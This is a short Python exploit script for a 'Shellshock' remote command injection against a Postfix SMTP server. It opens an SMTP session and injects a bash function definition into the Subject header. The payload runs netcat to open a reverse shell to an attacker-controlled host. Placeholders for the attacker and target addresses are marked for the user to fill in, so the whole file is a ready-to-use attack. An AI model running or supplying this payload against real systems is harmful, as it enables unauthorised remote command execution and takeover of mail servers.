#!/usr/bin/python3

#Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection
'''
Make some changes below on the <ATTACKER_IP> , <LISTENING_PORT> , <TARGET_IP> and <TARGET_PORT>
'''

import socket

payload = b"/bin/nc <ATTACKER_IP> <LISTENING PORT> -e /bin/sh;" #Change HERE


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.settimeout(20)
sock.connect(("<TARGET_IP>",<TARGET_PORT>)) #Change HERE
print(sock.recv(1024))
sock.send(b"helo test\r\n")
print(sock.recv(1024))
sock.send(b"Mail from: <VALIDmail1@MAIL.COM>\r\n")
print(sock.recv(1024))
sock.send(b"rcpt to: <VALIDmail2@MAIL.COM>\r\n")
print(sock.recv(1024))
sock.send(b"DATA\r\n")
print(sock.recv(1024))
sock.send(b"Subject:() { :; };" + payload + b"\r\n.\r\n")
print(sock.recv(1024))
sock.send(b"quit\r\n")
sock.close()
